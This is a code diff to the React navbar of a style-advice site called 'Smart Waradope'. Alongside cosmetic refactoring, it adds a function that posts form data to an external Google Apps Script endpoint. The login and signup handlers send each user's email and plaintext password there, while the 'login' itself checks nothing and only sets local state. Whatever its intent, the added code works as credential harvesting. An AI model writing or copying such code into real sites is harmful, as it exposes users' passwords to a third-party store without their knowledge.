@@ -16,7 +16,29 @@ const Navbar = () => {
   const [mobileMenu, setMobileMenu] = useState(false);
   const [mobileProfile, setMobileProfile] = useState(false);
 
-  /* ---------------------- Smooth Navigation ---------------------- */
+  /* GOOGLE SHEET API CALL */
+ const sendToGoogleSheet = async (payload: any) => {
+  try {
+    const res = await fetch(
+      "https://script.google.com/macros/s/AKfycbyi14wGfJWBMwW0yk-P5kSCHFxcb9jLoZBa14ekad2EPj1t7xqXEM_VgUiy01vktOSoLg/exec",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain;charset=utf-8",
+        },
+        body: JSON.stringify(payload),
+      }
+    );
+
+    console.log("Response:", res);
+
+  } catch (err) {
+    console.log("Google Sheet Error:", err);
+  }
+};
+
+
+  /* Smooth Scroll */
   const handleNavClick = (target: string) => {
     setLoading(true);
 
@@ -27,10 +49,12 @@ const Navbar = () => {
     }, 300);
   };
 
-  /* ---------------------- Login ---------------------- */
-  const handleLogin = () => {
-    const email = (document.getElementById("login-email") as HTMLInputElement)?.value;
-    const pass = (document.getElementById("login-pass") as HTMLInputElement)?.value;
+  /* LOGIN */
+  const handleLogin = async () => {
+    const email = (document.getElementById("login-email") as HTMLInputElement)
+      ?.value;
+    const pass = (document.getElementById("login-pass") as HTMLInputElement)
+      ?.value;
 
     if (!email || !pass) return alert("Enter all fields");
 
@@ -39,28 +63,45 @@ const Navbar = () => {
       gender: "male",
     });
 
+    /* SAVE LOGIN DATA TO GOOGLE SHEET */
+    await sendToGoogleSheet({
+      type: "login",
+      email,
+      password: pass,
+    });
+
     setShowLogin(false);
   };
 
-  /* ---------------------- Signup ---------------------- */
-  const handleSignup = () => {
-    const name = (document.getElementById("sign-name") as HTMLInputElement)?.value;
-    const email = (document.getElementById("sign-email") as HTMLInputElement)?.value;
-    const pass = (document.getElementById("sign-pass") as HTMLInputElement)?.value;
-    const gender = (document.getElementById("sign-gender") as HTMLSelectElement)?.value;
+  /* SIGNUP */
+  const handleSignup = async () => {
+    const name = (document.getElementById("sign-name") as HTMLInputElement)
+      ?.value;
+    const email = (document.getElementById("sign-email") as HTMLInputElement)
+      ?.value;
+    const pass = (document.getElementById("sign-pass") as HTMLInputElement)
+      ?.value;
+    const gender = (document.getElementById(
+      "sign-gender"
+    ) as HTMLSelectElement)?.value;
 
     if (!name || !email || !pass) return alert("Enter all fields");
 
-    setUser({
+    setUser({ name, email, gender });
+
+    /* SAVE SIGNUP DATA TO GOOGLE SHEET */
+    await sendToGoogleSheet({
+      type: "signup",
       name,
       email,
+      password: pass,
       gender,
     });
 
     setShowSignup(false);
   };
 
-  /* ---------------------- Logout ---------------------- */
+  /* LOGOUT */
   const handleLogout = () => {
     setUser(null);
     setMobileMenu(false);
@@ -72,9 +113,9 @@ const Navbar = () => {
     <>
       {loading && <Loader />}
 
-      {/* ---------------------- LOGIN MODAL ---------------------- */}
+      {/* LOGIN MODAL */}
       {showLogin && (
-        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[99999]">
+        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[9999]">
           <div className="bg-[#0d0f19] p-8 rounded-2xl w-80 border border-white/10 shadow-2xl">
             <h2 className="text-xl text-white mb-4 text-center">Login</h2>
 
@@ -84,6 +125,7 @@ const Navbar = () => {
               placeholder="Email"
               className="w-full px-3 py-2 mb-3 bg-[#151827] text-white rounded-lg border border-white/10"
             />
+
             <input
               id="login-pass"
               type="password"
@@ -108,11 +150,13 @@ const Navbar = () => {
         </div>
       )}
 
-      {/* ---------------------- SIGNUP MODAL ---------------------- */}
+      {/* SIGNUP MODAL */}
       {showSignup && (
-        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[99999]">
+        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[9999]">
           <div className="bg-[#0d0f19] p-8 rounded-2xl w-80 border border-white/10 shadow-2xl">
-            <h2 className="text-xl text-white mb-4 text-center">Create Account</h2>
+            <h2 className="text-xl text-white mb-4 text-center">
+              Create Account
+            </h2>
 
             <input
               id="sign-name"
@@ -120,12 +164,14 @@ const Navbar = () => {
               placeholder="Full Name"
               className="w-full px-3 py-2 mb-3 bg-[#151827] text-white rounded-lg border border-white/10"
             />
+
             <input
               id="sign-email"
               type="email"
               placeholder="Email"
               className="w-full px-3 py-2 mb-3 bg-[#151827] text-white rounded-lg border border-white/10"
             />
+
             <input
               id="sign-pass"
               type="password"
@@ -158,13 +204,10 @@ const Navbar = () => {
         </div>
       )}
 
-      {/* -------------------------------------------- NAVBAR -------------------------------------------- */}
-      <header className="fixed top-0 left-0 w-full z-[50] shadow-lg select-none">
-        <div className="absolute inset-0 bg-gradient-to-r from-[#050816] via-[#19275a] to-[#4b2b7f] opacity-95" />
-
+      {/* NAVBAR */}
+      <header className="fixed top-0 left-0 w-full z-[200] bg-gradient-to-r from-[#050816] via-[#19275a] to-[#4b2b7f] shadow-lg">
         <nav className="relative max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
-
-          {/* ----------------- LOGO ----------------- */}
+          {/* LOGO */}
           <div className="flex items-center gap-3 text-white">
             <Image
               src="/logo.jpg"
@@ -173,16 +216,17 @@ const Navbar = () => {
               height={42}
               className="rounded-lg shadow-lg"
             />
-
             <div className="flex flex-col leading-tight">
-              <span className="font-semibold text-sm sm:text-base">Smart Waradope</span>
+              <span className="font-semibold text-sm sm:text-base">
+                Smart Waradope
+              </span>
               <span className="text-[11px] sm:text-xs text-slate-300">
                 Style • Fit • Confidence
               </span>
             </div>
           </div>
 
-          {/* ----------------- DESKTOP NAV LINKS ----------------- */}
+          {/* DESKTOP NAV LINKS */}
           <div className="hidden md:flex items-center gap-10">
             {[
               { text: "Home", id: "#hero" },
@@ -200,7 +244,7 @@ const Navbar = () => {
             ))}
           </div>
 
-          {/* ----------------- DESKTOP USER ----------------- */}
+          {/* DESKTOP USER */}
           {!user ? (
             <div className="hidden md:flex items-center gap-3">
               <button
@@ -246,10 +290,10 @@ const Navbar = () => {
             </div>
           )}
 
-          {/* ----------------- MOBILE TOGGLE ----------------- */}
+          {/* MOBILE TOGGLE */}
           <div
             onClick={() => setMobileMenu(!mobileMenu)}
-            className="flex flex-col gap-[6px] cursor-pointer md:hidden"
+            className="flex flex-col gap-[6px] cursor-pointer md:hidden z-[300]"
           >
             <span
               className={`h-[3px] w-7 bg-purple-300 rounded transition ${
@@ -269,91 +313,93 @@ const Navbar = () => {
           </div>
         </nav>
 
-        {/* ---------------------- MOBILE MENU ---------------------- */}
-        {mobileMenu && (
-          <div className="md:hidden bg-[#0d1224]/95 backdrop-blur-xl border-t border-white/10 animate-slideDown">
+        {/* MOBILE MENU */}
+        <div
+          className={`md:hidden fixed left-0 w-full 
+            bg-[#0d1224]/95 backdrop-blur-xl 
+            border-t border-white/10 
+            transition-all duration-300
+            z-[250]
+            ${
+              mobileMenu
+                ? "top-16 opacity-100"
+                : "top-[-300px] opacity-0"
+            }`}
+        >
+          {[
+            { text: "Home", id: "#hero" },
+            { text: "Upload", id: "#suggestion" },
+            { text: "AI Looks", id: "#looks" },
+            { text: "About", id: "#about" },
+          ].map((l, i) => (
+            <button
+              key={i}
+              onClick={() => handleNavClick(l.id)}
+              className="w-full text-left px-6 py-3 text-slate-200 border-b border-white/10"
+            >
+              {l.text}
+            </button>
+          ))}
 
-            {[
-              { text: "Home", id: "#hero" },
-              { text: "Upload", id: "#suggestion" },
-              { text: "AI Looks", id: "#looks" },
-              { text: "About", id: "#about" },
-            ].map((l, i) => (
+          {!user ? (
+            <div className="px-6 py-4 space-y-3">
               <button
-                key={i}
-                onClick={() => handleNavClick(l.id)}
-                className="w-full text-left px-6 py-3 text-slate-200 border-b border-white/10"
+                onClick={() => {
+                  setMobileMenu(false);
+                  setShowLogin(true);
+                }}
+                className="w-full py-2 bg-blue-600 text-white rounded"
               >
-                {l.text}
+                Login
               </button>
-            ))}
 
-            {/* MOBILE USER */}
-            {!user ? (
-              <div className="px-6 py-4 space-y-3">
-
-                <button
-                  onClick={() => {
-                    setMobileMenu(false);
-                    setShowLogin(true);
-                  }}
-                  className="w-full py-2 bg-blue-600 text-white rounded"
-                >
-                  Login
-                </button>
-
-                <button
-                  onClick={() => {
-                    setMobileMenu(false);
-                    setShowSignup(true);
-                  }}
-                  className="w-full py-2 bg-gradient-to-r from-orange-500 to-pink-500 text-black rounded font-semibold"
-                >
-                  Signup
-                </button>
+              <button
+                onClick={() => {
+                  setMobileMenu(false);
+                  setShowSignup(true);
+                }}
+                className="w-full py-2 bg-gradient-to-r from-orange-500 to-pink-500 text-black rounded font-semibold"
+              >
+                Signup
+              </button>
+            </div>
+          ) : (
+            <div className="px-6 py-4">
+              <div
+                className="flex items-center gap-3 text-white cursor-pointer"
+                onClick={() => setMobileProfile(!mobileProfile)}
+              >
+                <Image
+                  src={user.gender === "female" ? "/gg.png" : "/bb.png"}
+                  width={40}
+                  height={40}
+                  alt="avatar"
+                  className="rounded-full border border-white/20"
+                />
+                <span className="text-lg">{user.name}</span>
               </div>
-            ) : (
-              <div className="px-6 py-4">
-                <div
-                  className="flex items-center gap-3 text-white cursor-pointer"
-                  onClick={() => setMobileProfile(!mobileProfile)}
-                >
-                  <Image
-                    src={user.gender === "female" ? "/gg.png" : "/bb.png"}
-                    width={40}
-                    height={40}
-                    alt="avatar"
-                    className="rounded-full border border-white/20"
-                  />
-                  <span className="text-lg">{user.name}</span>
-                </div>
 
-                {mobileProfile && (
-                  <button
-                    onClick={handleLogout}
-                    className="mt-4 w-full py-2 bg-red-600/80 text-white rounded"
-                  >
-                    Logout
-                  </button>
-                )}
-              </div>
-            )}
-          </div>
-        )}
+              {mobileProfile && (
+                <button
+                  onClick={handleLogout}
+                  className="mt-4 w-full py-2 bg-red-600/80 text-white rounded"
+                >
+                  Logout
+                </button>
+              )}
+            </div>
+          )}
+        </div>
       </header>
 
-      {/* ---------------------- ANIMATIONS ---------------------- */}
       <style>{`
         @keyframes slideDown {
           from { opacity: 0; transform: translateY(-10px); }
           to { opacity: 1; transform: translateY(0); }
         }
-        .animate-slideDown {
-          animation: slideDown .3s ease-out forwards;
-        }
       `}</style>
     </>
   );
-}
+};
 
 export default Navbar;
